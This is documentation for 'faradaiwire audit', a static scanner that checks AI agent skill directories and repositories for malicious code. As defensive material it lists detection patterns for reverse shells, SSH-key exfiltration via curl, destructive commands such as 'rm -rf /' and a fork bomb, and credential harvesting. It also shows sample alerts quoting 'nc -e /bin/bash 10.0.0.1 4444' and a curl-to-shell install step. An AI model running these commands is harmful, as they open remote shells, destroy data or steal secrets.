---
title: "faradaiwire audit"
description: "Scan downloaded agent skill directories or remote Git repositories for malicious code, backdoors, and credential harvesting."
---

# `faradaiwire audit` 🔍

The `audit` command performs high-speed static security analysis on agent skill directories, MCP server packages, or remote Git repositories before allowing an AI agent to execute or ingest them.

---

## Syntax

```bash
# Audit a local skill directory
faradaiwire audit <path-to-skill-directory> [--json]

# Audit a remote Git repository via isolated ephemeral scratchpad
faradaiwire audit <git-or-https-url> [--json]
```

---

## Threat Signatures Detected

FaradAiWire scans source code (Python, JavaScript, TypeScript, Bash, Go), configuration manifests, environment templates, and markdown prompts against canonical security rules:

| Category | High-Risk Threat Patterns |
| :--- | :--- |
| **Reverse Shells & Exfiltration** | `bash -i >& /dev/tcp/`, `nc -e`, `python -c "import pty..."`, `curl -d @~/.ssh/id_rsa` |
| **Destructive Commands** | `rm -rf /`, `mkfs`, `dd if=/dev/zero`, `:(){ :\|:& };:`, raw disk writes |
| **Privilege Escalation** | `sudo`, `doas`, `chmod +s`, `setuid`, manipulation of `sudoers` |
| **Credential Harvesting** | Hardcoded regexes targeting `.aws/credentials`, `.env`, `id_rsa`, OpenAI, AWS, GitHub PAT |
| **Dangerous Runtime Eval** | Obfuscated code execution (`eval(atob(...))`, `exec(base64.b64decode(...))`) |
| **Opaque Binary Executables** | Compiled native binaries (`.exe`, ELF, `.dylib`, `.so`) hidden inside skill directories |

---

## Sample Execution

### 1. Clean Skill Audit (Local Directory)
```bash
faradaiwire audit ./skills/git-helper
```

```text
Scanning skill directory: ./skills/git-helper
Scanned 12 files across Markdown, Python.
[✓] No malicious shell invocations found
[✓] No credential harvesting signatures detected
[✓] No destructive system commands found
[✓] No unauthorized outbound network connections found
[✓] No dangerous runtime eval/exec execution found
[✓] No privilege escalation commands detected
[✓] No opaque binary executables detected

Audit Result: PASSED (No threat signatures detected)
Exit Code: 0
```

### 2. Malicious Skill Detected
```bash
faradaiwire audit ./untrusted-skill
```

```text
Scanning skill directory: ./untrusted-skill
Scanned 2 files across Bash, Python.
[ALERT: CRITICAL] Reverse shell spawning or interactive netcat listener pattern in handler.py:42
    ↳ Matched: 'nc -e /bin/bash 10.0.0.1 4444'
[ALERT: CRITICAL] Destructive forced deletion targeting root or wildcard path (rm -rf) in setup.sh:12
    ↳ Matched: 'rm -rf /'

Audit Result: FAILED (2 vulnerabilities detected)
Exit Code: 2
```

### 3. Remote Ephemeral Skill Audit
You can audit remote repositories directly before cloning them into your workspace:

```bash
faradaiwire audit https://github.com/org/untrusted-skill
```

1. FaradAiWire creates a secure, isolated scratchpad directory in `/tmp/faradai-audit-<uuid>/`.
2. Clones the repository with Git hooks strictly suppressed (`--config core.hooksPath=/dev/null`) and a 25 MB archive limit.
3. Performs the complete static security scan and outputs the report.
4. **Guaranteed Purge:** The scratchpad directory is guaranteed to be deleted immediately upon exit via `defer os.RemoveAll`.

### 4. Structured JSON Output (CI/CD Pipelines)
For programmatic consumption, machine parsing, or GitHub Actions integration, pass the `--json` flag:

```bash
faradaiwire audit ./skills/git-helper --json
```

```json
{
  "root_path": "./skills/git-helper",
  "scanned_files": 12,
  "language_distribution": {
    "Markdown": 8,
    "Python": 4
  },
  "issues": [],
  "categories_passed": [
    "shell_execution",
    "credential_harvesting",
    "destructive_commands",
    "network_backdoor",
    "dangerous_eval",
    "privilege_escalation",
    "opaque_binary"
  ]
}
```

When vulnerabilities are found, `--json` outputs the full array of issues with line numbers, code snippets, severity, and category, and exits with code `2`. If a system or git clone error occurs, a structured error object is emitted with exit code `1`.

---

## Integrating into CI/CD

Integrate `faradaiwire audit` into your CI/CD pipelines or pre-commit hooks to block malicious dependencies before merging:

```yaml
# .github/workflows/skill-audit.yml
name: Skill Security Audit
on: [push, pull_request]

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Install FaradAiWire
        run: curl -fsSL https://raw.githubusercontent.com/FaradAiLab/FaradAiWire/main/install.sh | sh
      - name: Audit Skills
        run: faradaiwire audit ./skills/
```

---

> [!NOTE]
> **Static Heuristic Analysis Disclaimer:** `faradaiwire audit` scans source code and manifests against known high-risk threat signatures and opaque binaries. It does not execute dynamic code or provide a guarantee against novel zero-day exploits. To defend against in-flight attacks at runtime, use FaradAiWire Gateway's zero-trust PEP and SLM Semantic Guard.
